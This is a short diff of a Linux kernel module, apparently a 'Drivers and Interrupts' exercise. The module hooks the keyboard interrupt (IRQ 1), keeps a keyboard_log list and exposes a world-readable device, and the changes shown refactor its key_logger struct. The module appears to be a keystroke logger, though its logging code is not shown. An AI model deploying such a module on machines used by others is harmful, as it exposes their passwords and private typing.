@@ -23,18 +23,13 @@ static struct miscdevice device = {
     .mode           = 0444,
 };
 
-struct logger {
-    char code;
-} key_logger;
-
-
 struct mutex lock = __MUTEX_INITIALIZER(lock);
+static struct logger key_logger =  { 0, 0 };
 
 static int __init m_init(void) {
     struct linked_list_node *ptr, *tmp;
     int err = 0;
 	printk(KERN_INFO "Drivers and Interrupts (init)\n");
-
 
     if (request_irq(1, key_logger_isr, IRQF_SHARED, "i8042", &key_logger)) {
         err = -EBUSY;
@@ -48,7 +43,7 @@ static int __init m_init(void) {
 	return 0;
 
 err_free_keyboard_notifier:
-    free_irq(1,&key_logger);
+    free_irq(1, &key_logger);
 err_free_linked_list:
     list_for_each_entry_safe(ptr, tmp, &keyboard_log, list) {
         list_del(&ptr->list);
